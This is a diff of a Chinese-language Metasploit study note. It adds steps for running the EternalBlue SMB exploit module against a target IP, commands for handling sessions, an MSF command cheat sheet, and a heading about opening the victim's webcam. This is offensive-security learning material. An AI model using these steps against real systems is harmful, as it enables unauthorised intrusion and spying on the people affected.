@@ -1,8 +1,9 @@
-
+<!---
 ```diff
 + green color text
 - red color text
 ```
+-->
 
 + 進入metasploit
   - msfdb init : 初始化數據庫 (若沒執行這行，連接數據庫會有問題)
@@ -60,10 +61,35 @@
 
 + use exploit/windows/smb/ms17_010_eternalblue
 + options
-+ 
++ set rhosts ip
++ show targets
++ run
 
+![image](https://user-images.githubusercontent.com/96654161/170538076-6daa23d6-324e-4a85-af13-0ba5bc71738e.png)
+![image](https://user-images.githubusercontent.com/96654161/170542273-10a4a4fb-3675-4f8a-a251-9986197e8170.png)
+![image](https://user-images.githubusercontent.com/96654161/170542834-39ae3629-4501-4b9b-8d89-03b2771d5806.png)
 
+>sessions[-l] : 列出當前所有session
+>sessions[-i]id:進入某個session
+>background : 把當前shell放到後台去執行，然後返回到MSF中
 
+![image](https://user-images.githubusercontent.com/96654161/170543869-79dae501-522f-4151-80f5-8cb957994134.png)
+
+```diff
+show exploits -> 查看所有可用的滲透攻擊程序代碼 
+show auxiliary -> 查看所有可用的輔助攻擊工具
+[show]options/advanced -> 查看該模塊可用選項
+show payloads -> 查看該模塊適用的所有載荷代碼
+show targets -> 查看該模塊適用的攻擊目標類型
+search -> 根據關鍵字搜索某模塊
+info -> 顯示某模塊的詳細信息
+use -> 使用某滲透攻擊模塊
+back -> 回退
+set/unset -> 設置/禁用模塊中的某個參數
+setg/unsetg -> 設置/禁用適用於所有模塊的全局參數
+save -> 將當前設置值保存下來，以便下次啟動MSF終端時仍可使用
+```
+### 開啟攝像頭
 
 
 
